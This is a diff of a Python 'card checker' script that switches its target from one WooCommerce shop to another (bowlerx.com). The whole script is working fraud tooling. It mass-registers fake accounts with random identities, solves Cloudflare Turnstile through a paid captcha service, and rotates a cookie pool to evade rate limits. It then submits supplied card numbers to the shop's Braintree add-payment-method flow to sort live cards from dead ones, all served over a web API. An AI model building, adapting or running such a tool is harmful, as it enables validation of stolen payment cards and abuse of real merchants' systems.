@@ -1,12 +1,12 @@
 """
-new.py — LearnMuscles Braintree AUTH Gate ($0 verification)
-High-performance, multi-threaded account pool & card checker based on owc_auth.py architecture.
+new.py — BowlerX Braintree AUTH Gate ($0 verification)
+High-performance, multi-threaded account pool & card checker for Render & Railway.
 
-Site: https://learnmuscles.com
-Register: /affiliate-area/ (captcha-free affiliate registration, auto-logs in)
+Site: https://www.bowlerx.com
+Register: /my-account/ (Cloudflare Turnstile solved via CaptchaAI)
 Billing Address: /my-account/edit-address/billing/
 Add Payment Method: /my-account/add-payment-method/
-Gateway: Braintree Auth ($0 verification) - Cookie pool powered, no password login required.
+Gateway: Braintree Auth ($0 verification) - Direct Account Pool Powered.
 """
 
 import sys
@@ -18,11 +18,11 @@ import random
 import os
 import time
 import string
-import hashlib
 import threading
 from datetime import datetime
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from curl_cffi import requests as rq
+import requests as plain_requests
 
 try:
     from dotenv import load_dotenv
@@ -48,17 +48,23 @@ except Exception:
 # ─── Configuration ───────────────────────────────────────────
 GATEWAY = "Braintree Auth"
 CREDIT = "@xoxhunterxd"
-BASE = os.environ.get("LM_SITE", os.environ.get("BASE_URL", "https://learnmuscles.com")).rstrip("/")
+BASE = os.environ.get("BOWLERX_SITE", os.environ.get("BASE_URL", "")).rstrip("/")
 PM_URL = "/my-account/add-payment-method/"
 GQL_URL = "https://payments.braintree-api.com/graphql"
 IMP = os.environ.get("IMPERSONATE", "chrome120")
 DEFAULT_PROXY = os.environ.get("PROXY", "")
-COOKIE_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), os.environ.get("COOKIE_FILE", "lm_cookies.json"))
+COOKIE_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), os.environ.get("COOKIE_FILE", "bowlerx_cookies.json"))
 UA = os.environ.get(
     "USER_AGENT",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
     "(KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
 )
+
+# CaptchaAI Turnstile Configuration
+CAPTCHAAI_KEY = os.environ.get("CAPTCHAAI_KEY", "")
+CF_SITEKEY = "0x4AAAAAAAOMqUubBeXy8JVc"
+CAPTCHAAI_IN_URL = "https://ocr.captchaai.com/in.php"
+CAPTCHAAI_RES_URL = "https://ocr.captchaai.com/res.php"
 
 # Account Pool Constraints: Minimum 20 is compulsory, Maximum 20000
 MIN_POOL_SIZE = max(20, int(os.environ.get("MIN_POOL_SIZE", "20")))
@@ -100,7 +106,7 @@ _stop = threading.Event()
 _auto_maintain_running = False
 _auto_maintain_lock = threading.Lock()
 _cookie_cooldowns = {}
-COOKIE_COOLDOWN_SECONDS = 20
+COOKIE_COOLDOWN_SECONDS = 15
 
 # ─── Utility Functions ────────────────────────────────────────
 
@@ -146,6 +152,7 @@ def sanitize(msg):
     msg = re.sub(r"(HTTPS?|HTTP)ConnectionPool\([^)]+\):\s*", "", msg)
     msg = re.sub(r"Max retries.*", "Timeout", msg)
     msg = re.sub(r"https?://[^\s'\")\]]+", "", msg)
+    msg = re.sub(r"bowlerx\.com", "", msg)
     msg = re.sub(r"learnmuscles\.com", "", msg)
     msg = re.sub(r"software\.owc\.com", "", msg)
     msg = re.sub(r"[a-zA-Z0-9._-]+\.braintreegateway\.com", "", msg)
@@ -209,7 +216,7 @@ def get_cookie():
         return None
     with _lock:
         now = time.time()
-        # Find all accounts whose 20s cooldown has expired
+        # Find all accounts whose cooldown has expired
         eligible = [
             acc for acc in p
             if now - _cookie_cooldowns.get(acc.get("email"), 0) >= COOKIE_COOLDOWN_SECONDS
@@ -217,7 +224,7 @@ def get_cookie():
         if eligible:
             chosen = random.choice(eligible)
         else:
-            # If all cookies are currently in 20s cooldown, pick the one waiting the longest
+            # If all cookies are currently in cooldown, pick the one waiting the longest
             chosen = min(p, key=lambda acc: _cookie_cooldowns.get(acc.get("email"), 0))
             wait = COOKIE_COOLDOWN_SECONDS - (now - _cookie_cooldowns.get(chosen.get("email"), 0))
             if wait > 0:
@@ -247,82 +254,63 @@ def remove_cookie(em, proxy=None):
     t = threading.Thread(target=create_accounts_bg, args=(1, proxy), daemon=True)
     t.start()
 
-# ─── WAF Solver ───────────────────────────────────────────────
+# ─── CaptchaAI Turnstile Solver ────────────────────────────────
 
-def ensure_solved(s, check_url=None):
-    """Solves LearnMuscles /hcdn-cgi/jschallenge challenge if presented."""
-    url = check_url or (BASE + "/my-account/")
+def solve_turnstile_captchaai(page_url, sitekey=CF_SITEKEY, max_wait=90):
+    """Solves Cloudflare Turnstile token using CaptchaAI API."""
     try:
-        r = s.get(url, timeout=30, headers={"Accept": "text/html"})
-        if r.status_code == 200 and "Checking your browser" not in r.text:
-            return True
-        time.sleep(2)
-        js = s.get(
-            BASE + "/hcdn-cgi/jschallenge",
-            timeout=30,
-            headers={"Referer": url}
-        ).text
-        m = re.search(r"cjs\s*=\s*'([^']+)'", js)
-        if not m:
-            return False
-        h = hashlib.sha256(m.group(1).encode()).hexdigest()
-        time.sleep(3)
-        rv = s.post(
-            BASE + "/hcdn-cgi/jschallenge-validate",
-            data="challenge=" + h,
-            timeout=30,
-            headers={
-                "Referer": url,
-                "Content-Type": "application/x-www-form-urlencoded",
-                "Accept": "*/*",
-                "X-Requested-With": "XMLHttpRequest",
-                "Origin": BASE
-            }
-        )
-        return rv.status_code == 200 and "hcdn" in s.cookies
+        r = plain_requests.get(CAPTCHAAI_IN_URL, params={
+            "key": CAPTCHAAI_KEY,
+            "method": "turnstile",
+            "sitekey": sitekey,
+            "pageurl": page_url,
+            "json": 1
+        }, timeout=25)
+        data = r.json()
+        if data.get("status") != 1:
+            return None
+        task_id = data.get("request")
+
+        start = time.time()
+        while time.time() - start < max_wait:
+            time.sleep(2.5)
+            res = plain_requests.get(CAPTCHAAI_RES_URL, params={
+                "key": CAPTCHAAI_KEY,
+                "action": "get",
+                "id": task_id,
+                "json": 1
+            }, timeout=20).json()
+
+            if res.get("status") == 1:
+                return res.get("request")
+            elif "CAPCHA_NOT_READY" in str(res.get("request", "")):
+                continue
+            else:
+                return None
+        return None
     except Exception:
-        return False
+        return None
 
 # ─── Background Session Verification (Only Remove If Session Expired) ───
 
 def is_truly_session_expired(resp_text, resp_url, status_code=200):
-    """
-    STRICT check: Only returns True when the response explicitly confirms
-    the user's WordPress/WooCommerce session is EXPIRED and user must log in.
-    NEVER returns True for:
-      - Wordfence blocks (503 / "limited by the site owner")
-      - Cloudflare / hcdn WAF challenges ("Checking your browser")
-      - Cooldowns ("so soon", "wait for 20 seconds")
-      - Processor declines or Braintree status codes
-      - Transient network, 500, 502, or 504 errors
-    """
     if not resp_text:
         return False
 
     text_lower = resp_text.lower()
 
-    # Exclude Wordfence rate-limit blocks
     if "limited by the site owner" in text_lower or status_code == 503:
         return False
-
-    # Exclude WAF challenges
     if "checking your browser" in text_lower:
         return False
-
-    # Exclude payment method cooldowns
     if "so soon" in text_lower or "wait for" in text_lower:
         return False
-
-    # Exclude processor declines / Braintree status codes
-    if "status code" in text_lower or "processor declined" in text_lower:
+    if "status code" in text_lower or "processor declined" in text_lower or "gateway rejected" in text_lower:
         return False
 
-    # 1. Explicit session expired messages in response
     if "session expired" in text_lower or "your session has expired" in text_lower:
         return True
 
-    # 2. WordPress / WooCommerce login redirect:
-    # When session is expired, accessing /add-payment-method/ redirects to /my-account/ login form
     if "woocommerce-form-login" in text_lower or 'name="login"' in text_lower:
         if "add-payment-method" not in resp_url and ("/my-account" in resp_url or "login" in resp_url):
             return True
@@ -330,10 +318,6 @@ def is_truly_session_expired(resp_text, resp_url, status_code=200):
     return False
 
 def verify_and_clean_cookie_bg(entry, proxy=None):
-    """
-    Background verification: ONLY remove a cookie when the response is strictly SESSION EXPIRED.
-    Otherwise, DO NOT remove.
-    """
     em = entry.get("email")
     if not em:
         return
@@ -349,39 +333,19 @@ def verify_and_clean_cookie_bg(entry, proxy=None):
         s.cookies.set(k, v)
 
     try:
-        # Step 1: Ensure WAF solved
-        if not ensure_solved(s, check_url=BASE + PM_URL):
-            return
-
-        # Step 2: Try fetching PM_URL
         r = s.get(BASE + PM_URL, timeout=30, headers={"Accept": "text/html"})
         h = r.text
 
-        # If challenge appears again, solve once more
-        if "Checking your browser" in h:
-            if ensure_solved(s, check_url=BASE + PM_URL):
-                r = s.get(BASE + PM_URL, timeout=30, headers={"Accept": "text/html"})
-                h = r.text
-            else:
-                return
-
-        # Check for nonces
         apn = re.search(r'name="woocommerce-add-payment-method-nonce"\s+value="([^"]+)"', h)
         ctn = re.search(r'"id":"braintree_credit_card"[^}]*client_token_nonce["\s:]+"([^"]+)"', h) or re.search(r'client_token_nonce["\s:]+"([^"]+)"', h)
 
         if apn and ctn:
-            # Cookie is STILL WORKING! Do not remove, refresh saved cookies in pool
             update_account_cookies(em, dict(s.cookies))
             return
 
-        # STRICT: ONLY remove if the response confirms session is EXPIRED! Else DO NOT remove!
         if is_truly_session_expired(h, r.url, r.status_code):
             remove_cookie(em, proxy=proxy)
-        else:
-            # Wordfence, cooldown, transient error, or anything else -> NEVER REMOVE!
-            pass
     except Exception:
-        # Network hiccup or error -> NEVER REMOVE!
         pass
 
 # ─── Randomized Identity & Account Creator ────────────────────
@@ -404,10 +368,6 @@ EMAIL_DOMAINS = [
 ]
 
 def generate_random_identity():
-    """
-    Generates completely random usernames and emails with no similarities or fixed prefixes.
-    Ensures high variance in pattern, length, and domain.
-    """
     fn, ln = rand_name()
     style = random.randint(1, 5)
 
@@ -423,12 +383,10 @@ def generate_random_identity():
         prefix = "".join(random.choices(string.ascii_lowercase, k=random.randint(5, 7)))
         user = f"{prefix}{random.randint(100, 9999)}"
 
-    # Clean username: alphanumeric only
     user = re.sub(r'[^a-z0-9]', '', user.lower())
     if len(user) < 6:
         user = user + rnd(6 - len(user))
 
-    # Randomized Email Generation (No similarities, rotating domains)
     domain = random.choice(EMAIL_DOMAINS)
     email_style = random.randint(1, 4)
     if email_style == 1:
@@ -441,43 +399,19 @@ def generate_random_identity():
         mail = f"{fn.lower()}{rnd(random.randint(3, 5))}{random.randint(10, 999)}@{domain}"
 
     mail = mail.lower()
-
-    # Rotating realistic website URLs
-    tld = random.choice(["com", "org", "net", "io", "co", "me", "blog"])
-    web_style = random.randint(1, 3)
-    if web_style == 1:
-        site_url = f"https://www.{rnd(random.randint(7, 11))}.{tld}"
-    elif web_style == 2:
-        site_url = f"https://{fn.lower()}{ln.lower()}.{tld}"
-    else:
-        site_url = f"https://{user}.{tld}"
-
-    # Rotating realistic promotion methods
-    methods = [
-        "Social media fitness reviews and training routines.",
-        "Educational blog on biomechanics and movement science.",
-        "Personal fitness trainer client recommendations.",
-        "YouTube channel covering functional exercise tutorials.",
-        "Physical therapy, sports rehabilitation, and wellness forum.",
-        "Online pilates, mobility, and anatomy coaching community.",
-        "Health newsletter and weekly podcast recommendations.",
-        "Athletic performance training blog and equipment reviews."
-    ]
-    promo_method = random.choice(methods)
-
-    return fn, ln, user, mail, site_url, promo_method
+    return fn, ln, user, mail
 
 def create_account(proxy=None):
     """
-    Creates an account via captcha-free affiliate registration.
-    Uses completely randomized, distinct usernames and emails (no similarities).
-    Retries up to 3 times on transient failures.
+    Creates an account directly on BowlerX via /my-account/.
+    Solves Cloudflare Turnstile using CaptchaAI.
+    Saves billing address for Braintree vault.
     """
     px = format_proxy(proxy)
     proxies = {"http": px, "https": px} if px else None
 
-    for attempt in range(3):
-        fn, ln, user, mail, site_url, promo_method = generate_random_identity()
+    for attempt in range(2):
+        fn, ln, user, mail = generate_random_identity()
 
         addr_info = random.choice(US_ADDRESSES)
         street_parts = addr_info['street'].split(' ', 1)
@@ -490,70 +424,47 @@ def create_account(proxy=None):
         s = rq.Session(impersonate=IMP, headers={"User-Agent": UA, "Accept-Language": "en-US,en;q=0.9"}, proxies=proxies)
 
         try:
-            # Step 1: Ensure WAF solved
-            if not ensure_solved(s, check_url=BASE + "/affiliate-area/"):
+            # Step 1: Grab registration nonce from /my-account/
+            h = s.get(BASE + "/my-account/", timeout=30).text
+            rn = re.search(r'name="woocommerce-register-nonce"\s+value="([^"]+)"', h)
+            if not rn:
                 time.sleep(1.0)
                 continue
 
-            # Step 2: Grab affiliate registration nonce
-            H = {"Accept": "text/html", "Referer": BASE + "/affiliate-area/"}
-            t = s.get(BASE + "/affiliate-area/", timeout=30, headers=H).text
-            if "Checking your browser" in t:
-                if not ensure_solved(s, check_url=BASE + "/affiliate-area/"):
-                    continue
-                t = s.get(BASE + "/affiliate-area/", timeout=30, headers=H).text
-
-            nm = re.search(r'name="affwp_register_nonce"\s+value="([^"]+)"', t)
-            if not nm:
-                if "limited by the site owner" in t.lower() or "503" in t:
-                    time.sleep(random.uniform(5.0, 10.0))
-                else:
-                    time.sleep(1.0)
+            # Step 2: Solve Cloudflare Turnstile token via CaptchaAI
+            cf_token = solve_turnstile_captchaai(BASE + "/my-account/")
+            if not cf_token:
+                time.sleep(1.0)
                 continue
 
-            # Step 3: Register via Affiliate form
+            # Step 3: Submit Registration
             rp = s.post(
-                BASE + "/affiliate-area/",
+                BASE + "/my-account/",
                 data={
-                    "affwp_user_name": f"{fn} {ln}",
-                    "affwp_user_login": user,
-                    "affwp_user_email": mail,
-                    "affwp_payment_email": mail,
-                    "affwp_user_url": site_url,
-                    "affwp_promotion_method": promo_method,
-                    "affwp_honeypot": "",
-                    "affwp_redirect": "",
-                    "affwp_register_nonce": nm.group(1),
-                    "affwp_action": "affiliate_register"
+                    "email": mail,
+                    "cf-turnstile-response": cf_token,
+                    "mailchimp_woocommerce_newsletter": "1",
+                    "woocommerce-register-nonce": rn.group(1),
+                    "_wp_http_referer": "/my-account/",
+                    "register": "Register"
+                },
+                headers={
+                    "Content-Type": "application/x-www-form-urlencoded",
+                    "Origin": BASE,
+                    "Referer": BASE + "/my-account/"
                 },
                 timeout=40,
-                headers={
-                    "Referer": BASE + "/affiliate-area/",
-                    "Content-Type": "application/x-www-form-urlencoded",
-                    "Accept": "text/html"
-                }
+                allow_redirects=True
             )
 
-            is_success = (
-                "affwp-affiliate-dashboard-tabs" in rp.text or
-                any("wordpress_logged_in" in k for k in s.cookies.keys()) or
-                "affiliate-area" in rp.url
-            )
-
-            if not is_success and ("already exists" in rp.text.lower() or "already registered" in rp.text.lower()):
-                time.sleep(0.5)
-                continue
-
-            if not is_success and (rp.status_code == 503 or "limited by the site owner" in rp.text.lower()):
-                time.sleep(random.uniform(8.0, 15.0))
-                continue
+            is_success = any("wordpress_logged_in" in k for k in s.cookies.keys())
 
             if not is_success:
                 time.sleep(1.0)
                 continue
 
-            # Step 4: Save Billing Address (Required for Braintree vault — fixes 81801)
-            be = s.get(BASE + "/my-account/edit-address/billing/", timeout=30, headers={"Accept": "text/html"}).text
+            # Step 4: Save Billing Address (Required for Braintree vault)
+            be = s.get(BASE + "/my-account/edit-address/billing/", timeout=30).text
             bn = re.search(r'name="woocommerce-edit-address-nonce"\s+value="([^"]+)"', be)
             if bn:
                 s.post(
@@ -575,12 +486,13 @@ def create_account(proxy=None):
                         "_wp_http_referer": "/my-account/edit-address/billing/",
                         "action": "edit_address"
                     },
-                    timeout=40,
                     headers={
                         "Referer": BASE + "/my-account/edit-address/billing/",
                         "Content-Type": "application/x-www-form-urlencoded",
-                        "Accept": "text/html"
-                    }
+                        "Origin": BASE
+                    },
+                    timeout=40,
+                    allow_redirects=True
                 )
 
             ck = dict(s.cookies)
@@ -615,7 +527,7 @@ def create_account(proxy=None):
 
     return {"email": "fail", "status": "fail"}
 
-# ─── Multi-Threaded Background Account Creator (10 Threads) ───
+# ─── Multi-Threaded Background Account Creator ────────────────
 
 def create_accounts_bg(count, proxy=None):
     global _building, _req, _done, _fail
@@ -633,11 +545,6 @@ def create_accounts_bg(count, proxy=None):
                 _fail += 1
             return
         px = format_proxy(proxy)
-        # If no proxy configured, add pacing between requests to avoid Wordfence IP block
-        if not px:
-            time.sleep(random.uniform(1.5, 3.5))
-        else:
-            time.sleep(random.uniform(0.2, 0.6))
         r = create_account(proxy=proxy)
         with _b_lock:
             _building -= 1
@@ -671,7 +578,7 @@ def auto_maintain_pool(proxy=None):
 
                 needed = MIN_POOL_SIZE - (len(pool) + currently_building)
                 if needed > 0 and not _stop.is_set():
-                    batch_needed = max(20, needed)
+                    batch_needed = max(10, needed)
                     create_accounts_bg(batch_needed, proxy=proxy)
         except Exception:
             pass
@@ -731,10 +638,6 @@ def check_card(cc, mm, yy, cvv, proxy=None, retries=2):
     try:
         # 1. Fetch add-payment-method page
         h = s.get(BASE + PM_URL, timeout=30, headers={"Accept": "text/html"}).text
-        if "Checking your browser" in h:
-            if not ensure_solved(s):
-                return result("Try Again Later")
-            h = s.get(BASE + PM_URL, timeout=30, headers={"Accept": "text/html"}).text
 
         apn = re.search(r'name="woocommerce-add-payment-method-nonce"\s+value="([^"]+)"', h)
         ctn = None
@@ -748,7 +651,6 @@ def check_card(cc, mm, yy, cvv, proxy=None, retries=2):
 
         # Nonce missing: do not remove cookie immediately!
         if not apn or not ctn:
-            # Trigger background verification: only remove if background recheck confirms session is expired!
             threading.Thread(target=verify_and_clean_cookie_bg, args=(entry, proxy), daemon=True).start()
 
             if retries > 0:
@@ -758,11 +660,7 @@ def check_card(cc, mm, yy, cvv, proxy=None, retries=2):
                 if fresh.get("status") == "success":
                     return check_card(cc, mm, yy, cvv, proxy=proxy, retries=retries - 1)
             
-            if "limited by the site owner" in h.lower() or "503" in h:
-                return result("Wordfence Rate Limit (503)")
-            elif "checking your browser" in h.lower():
-                return result("WAF Challenge Unresolved")
-            elif "login" in h.lower() or "woocommerce-form-login" in h.lower():
+            if "login" in h.lower() or "woocommerce-form-login" in h.lower():
                 return result("Session Expired")
             return result("Gateway Nonce Missing")
 
@@ -796,39 +694,34 @@ def check_card(cc, mm, yy, cvv, proxy=None, retries=2):
         fn, ln = rand_name()
         b = entry.get("bill", {})
 
-        cardholder = f"{b.get('fn', fn)} {b.get('ln', ln)}".strip()
-        billing_addr = {
-            "streetAddress": b.get("addr", "123 Main St"),
-            "locality": b.get("city", "New York"),
-            "region": b.get("state", "NY"),
-            "postalCode": b.get("pc", "10001"),
-            "countryCodeAlpha2": "US"
+        p = {
+            "clientSdkMetadata": {"source": "client", "integration": "custom", "sessionId": uuid.uuid4().hex},
+            "query": "mutation T($i:TokenizeCreditCardInput!){tokenizeCreditCard(input:$i){token}}",
+            "variables": {
+                "i": {
+                    "creditCard": {
+                        "number": str(cc).strip(),
+                        "expirationMonth": str(mm).strip(),
+                        "expirationYear": yf,
+                        "cvv": cvv_c,
+                        "cardholderName": f"{fn} {ln}",
+                        "billingAddress": {
+                            "streetAddress": b.get("addr", "123 Main St"),
+                            "locality": b.get("city", "New York"),
+                            "region": b.get("state", "NY"),
+                            "postalCode": b.get("pc", "10001"),
+                            "countryCodeAlpha2": "US"
+                        }
+                    },
+                    "options": {"validate": False}
+                }
+            },
+            "operationName": "T"
         }
 
         td = rq.post(
             GQL_URL,
-            json={
-                "clientSdkMetadata": {
-                    "source": "client",
-                    "integration": "custom",
-                    "sessionId": uuid.uuid4().hex
-                },
-                "query": "mutation T($i:TokenizeCreditCardInput!){tokenizeCreditCard(input:$i){token}}",
-                "variables": {
-                    "i": {
-                        "creditCard": {
-                            "number": str(cc).strip(),
-                            "expirationMonth": str(mm).strip(),
-                            "expirationYear": yf,
-                            "cvv": cvv_c,
-                            "cardholderName": cardholder,
-                            "billingAddress": billing_addr
-                        },
-                        "options": {"validate": False}
-                    }
-                },
-                "operationName": "T"
-            },
+            json=p,
             impersonate=IMP,
             proxies=proxies,
             timeout=35,
@@ -906,39 +799,27 @@ def check_card(cc, mm, yy, cvv, proxy=None, retries=2):
                 return result(f"APPROVED - {clean_m}")
 
         # Check for Braintree processor response / status code (Full exact response)
-        m_status = re.search(r'(Status code\s*\d+:\s*[^<]+)', r.text, re.I)
+        m_status = re.search(r'(Status code\s*[^<]+)', r.text, re.I)
         if m_status:
             clean_stat = re.sub(r'<[^>]+>', ' ', m_status.group(1))
             return result(re.sub(r'\s+', ' ', clean_stat).strip())
 
-        m_status_alt = re.search(r'Status code\s*(\d+)[:\s]+([^<]+)', r.text, re.I)
-        if m_status_alt:
-            clean_stat = re.sub(r'<[^>]+>', ' ', m_status_alt.group(0))
-            return result(re.sub(r'\s+', ' ', clean_stat).strip())
-
         found = []
         for m_err in re.finditer(r'<ul class="woocommerce-(?:error|message)[^"]*"[^>]*>(.*?)</ul>', r.text, re.S):
-            txt = re.sub(r"\s+", " ", re.sub(r"<[^>]+>", " ", m_err.group(1))).strip()
-            if txt and txt not in found:
-                found.append(txt)
+            lis = re.findall(r'<li>(.*?)</li>', m_err.group(1), re.S)
+            if lis:
+                for li in lis:
+                    c = re.sub(r'<[^>]+>', ' ', li).strip()
+                    c = re.sub(r'\s+', ' ', c)
+                    if c and c not in found:
+                        found.append(c)
+            else:
+                c = re.sub(r'<[^>]+>', ' ', m_err.group(1)).strip()
+                c = re.sub(r'\s+', ' ', c)
+                if c and c not in found:
+                    found.append(c)
 
-        if not found:
-            err = re.findall(r'class="woocommerce-(?:error|message)"[^>]*>(.*?)</(?:ul|div|li)', r.text, re.S)
-            if err:
-                clean_e = re.sub(r'<[^>]+>', ' ', err[0])
-                clean_e = re.sub(r'\s+', ' ', clean_e).strip()
-                found.append(clean_e)
-
-        err_text = " | ".join(found) if found else ""
-
-        # If error text contains status code, return the full exact response
-        m_code_in_err = re.search(r'(Status code\s*\d+[:\s]+[^|]+)', err_text, re.I)
-        if m_code_in_err:
-            return result(m_code_in_err.group(1).strip())
-
-        # Check if error contains 4-digit Braintree status code (e.g. 2000, 2001, 2038, etc.)
-        if re.search(r'\b(?:status\s*code|error\s*code|code)?\s*2\d{3}\b', err_text, re.I):
-            return result(err_text)
+        err_text = " | ".join(found).strip()
 
         # Check if cookie rate limited / cooldown ("so soon after the previous one")
         if "so soon" in err_text.lower() or "wait for" in err_text.lower():
@@ -1011,7 +892,7 @@ if app:
             "status": "ok",
             "gateway": GATEWAY,
             "type": "auth($0)",
-            "site": "learnmuscles",
+            "site": "bowlerx",
             "pool": len(load_pool()),
             "credit": CREDIT
         })
@@ -1135,6 +1016,6 @@ if __name__ == "__main__":
     port = int(os.environ.get("PORT", 8000))
     auto_maintain_pool()
 
-    print(f"LearnMuscles Braintree Auth gate ($0) | pool:{len(load_pool())} | port:{port}")
+    print(f"BowlerX Braintree Auth gate ($0) | pool:{len(load_pool())} | port:{port}")
     print(f"Build accounts: /b3?acc=20")
     uvicorn.run(app, host="0.0.0.0", port=port)
